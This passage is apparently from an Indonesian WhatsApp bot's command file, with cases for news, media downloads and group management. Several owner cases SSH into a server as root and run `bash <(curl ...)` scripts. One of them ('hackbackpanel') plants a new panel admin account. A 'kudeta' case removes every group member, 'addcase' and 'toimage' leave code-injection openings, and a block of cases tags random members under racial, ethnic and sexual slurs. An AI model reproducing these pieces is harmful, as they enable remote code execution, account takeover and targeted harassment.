break
//=================================================//
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
Ditss.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
break

		case 'threads': {
			if (!text) return m.reply(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
			m.reply(mess.wait)
			const createImage = async (url) => {
				const {
					imageMessage
				} = await generateWAMessageContent({
					image: {
						url
					}
				}, {
					upload: Ditss.waUploadToServer
				});
				return imageMessage;
			};
			const createVideo = async (url) => {
				const {
					videoMessage
				} = await generateWAMessageContent({
					video: {
						url
					}
				}, {
					upload: Ditss.waUploadToServer
				});
				return videoMessage;
			};
			let res;
			try {
				res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=GetsuzoZhiro`);
			} catch (error) {
				return reply(`Terjadi kesalahan: ${error.message}`);
			}
			let api_response = await res.json();
			if (!api_response || !api_response.result) {
				return reply(`Tidak Ada Video Atau Gambar Yang Ditemukan Atau Respon Dari Api Tidak Valid.`);
			}
			const imageUrls = api_response.result.image_urls;
			const videoUrls = api_response.result.video_urls;
			const mediaCards = [];
			if (videoUrls && videoUrls.length > 0) {
				for (const videoUrl of videoUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'VIDEO',
							hasMediaAttachment: true,
							videoMessage: await createVideo(videoUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}
			if (imageUrls && imageUrls.length > 0) {
				for (const imageUrl of imageUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'IMAGE',
							hasMediaAttachment: true,
							imageMessage: await createImage(imageUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}

			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: `> Threads Media🦚`
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards: mediaCards
							})
						})
					}
				}
			}, {});

			await Ditss.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			});
		}
		break

case 'nobg':
case 'removebg': {
if (!/image/.test(mime)) reply(`*Reply Image With Caption* ${prefix + command}`)
if (!quoted) reply(`*Reply Image With Caption* ${prefix + command}`)
let { TelegraPh } = require('./all/uploader')
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
await Ditss.sendMessage(m.chat, { image : { url : 'https://love.neekoi.me/r-bg?url=' + util.format(anu) }, caption: `ini... udah aku hapus :3` }, { quoted: m })
}
break

case 'aimeta':{
if (!text) return reply('input text nya');
 try {
 const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(text)}`;
 const response = await fetch(apiUrl);
 const mark = await response.json();

 const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda.';

 await Ditss.sendMessage(m.chat, { text: ress }, {quoted:m});
 
} catch (error) {
 console.error("Terjadi kesalahan:", error.message);
}
}
break

case 'reset':
 if (!isCreator) return
 reply(`🐣Restarting will be completed in seconds😼`)
 await sleep(3000)
 process.exit()
 break

case 'listban': 
//if (!isRegistered) return registerbut(noregis)
var data = Object.values(db.users).filter(v => v.banned)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂 *L I S T B A N N E D*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
/*Ditss.sendMessage(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})*/
reply(teks)
break //Powered By

case'wkasi':{
 if (isBanned) return m.reply(`anda di ban`)
    reply(`aloo`)
}
break

case 'kakhaj':{
reploy(`aloo`)
}
break

case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Ditss.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
case 'addcase': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Mana case nya tuan..');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = './case.js';



// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                m.reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                Reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        Reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break
//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Ditss.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Ditss.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
 if (cekSaldo(sender,db_saldo) < 1500) return Reply(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 2,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Ditss.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Ditss.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Ditss.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Ditss.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Ditss.newsletterMetadata("invite", result)
await Ditss.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*#- List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Ditss.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Ditss.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By asuma Starting 🔥")
for (let i of memberFilter) {
await Ditss.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Ditss.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Ditss.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285866435726\n');
stream.write('https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S\n');
stream.write('https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//=====
case 'sunda':
        case'gabut':
        case 'caper':
case 'setan':
case 'preman':
case 'anj':
case 'beban':
case 'tolol':
case 'goblog':
case 'goblok':
case 'idiot':
case 'gay':
case 'jomok':
case 'bajingan':
case 'munafik':
case 'kontol':
case 'yatim':
case 'poke':
case 'pembokep':
case 'hitam':
case 'hytam':
case 'dark sistem':
case 'bego':
case 'jawa':
case 'wibu':
case 'stress':
case 'miskin':
case 'cantik':
case 'manis':
case 'babi':
case 'ganteng':
case 'cina':
case 'atheis':
case 'papua':
case 'nigga':
case 'pengentot':
case 'seksi':
case 'kawai':
case 'tercindo':
case 'tampan':
case 'fembokef':
case 'pengocok':
case 'cabul':
case 'fuckboy':
case 'playboy':
case 'sange':
case 'sangean':
case 'hot': {
const participantss = m.isGroup ? await groupMetadata.participants : ''
            let member = participantss.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Ditss.sendMessage(m.chat,
{ text: `orang ${command} disini adalah @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${command} yang di tag`,
"body": `hiburan🗿🦚`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": `${linkSaluran}`}}},
{ quoted: qtext})        
            }
            break
      
//================================================================================
case 'videy':{
    if (!text) return m.reply("Masukkan Link Videy")
    if (!text.includes('videy')) return m.reply("Itu Bukan Link Videy")
    try {
        let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
        let anu1 = anu.data;
        Ditss.sendMessage(m.chat, { video: { url: anu1 }, caption: "Downloader Videy" }, { quoted: m });
    } catch (err) {
        m.reply("Terjadi Kesalahan Saat Mengambil Data")
    }
}
break
///////////========================/////////
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
